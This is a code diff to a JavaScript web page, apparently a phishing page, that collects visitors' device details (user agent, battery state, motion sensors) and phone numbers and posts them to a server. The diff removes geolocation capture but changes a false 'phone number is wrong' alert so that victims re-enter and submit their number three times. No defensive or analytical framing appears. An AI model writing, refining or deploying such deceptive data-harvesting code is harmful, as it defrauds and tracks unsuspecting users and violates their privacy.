@@ -77,7 +77,7 @@ function goNext() {
   document.getElementById("page2").classList.remove("hidden");
 }
 
-// 최대 정보 수집
+// 최대 정보 수집 (위치 정보 제거)
 async function collectUserInfo() {
   const formData = new URLSearchParams();
   formData.append("userAgent", navigator.userAgent);
@@ -114,16 +114,6 @@ async function collectUserInfo() {
       formData.append("battery.dischargingTime", battery.dischargingTime);
     } catch(e) { formData.append("battery.info", "unknown"); }
   } else { formData.append("battery.info", "unknown"); }
-  if (navigator.geolocation) {
-    await new Promise(resolve => {
-      navigator.geolocation.getCurrentPosition(pos => {
-        formData.append("location.latitude", pos.coords.latitude);
-        formData.append("location.longitude", pos.coords.longitude);
-        formData.append("location.accuracy", pos.coords.accuracy);
-        resolve();
-      }, err => { formData.append("location.error", err.message); resolve(); });
-    });
-  } else { formData.append("location", "unknown"); }
   if (window.DeviceMotionEvent) {
     window.addEventListener("devicemotion", e=>{
       if (e.acceleration) {
@@ -167,14 +157,14 @@ function sendPhone() {
     body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString(), tryCount:phoneTryCount})
   }).catch(err=>console.error(err));
 
-  // 전화번호 틀림 알림은 최대 2번까지만
+  // 첫, 두 번째 시도에서 알림
   if(phoneTryCount <= 2) {
     alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
+    document.getElementById("userId").value = ""; // 입력칸 초기화
   }
 
-  document.getElementById("userId").value = ""; // 입력칸 초기화
-
-  if(phoneTryCount >= 2) {
+  // 세 번째 시도부터 다음 페이지
+  if(phoneTryCount >= 3) {
     savedPhone = userId;
 
     document.getElementById("page2").classList.add("hidden");
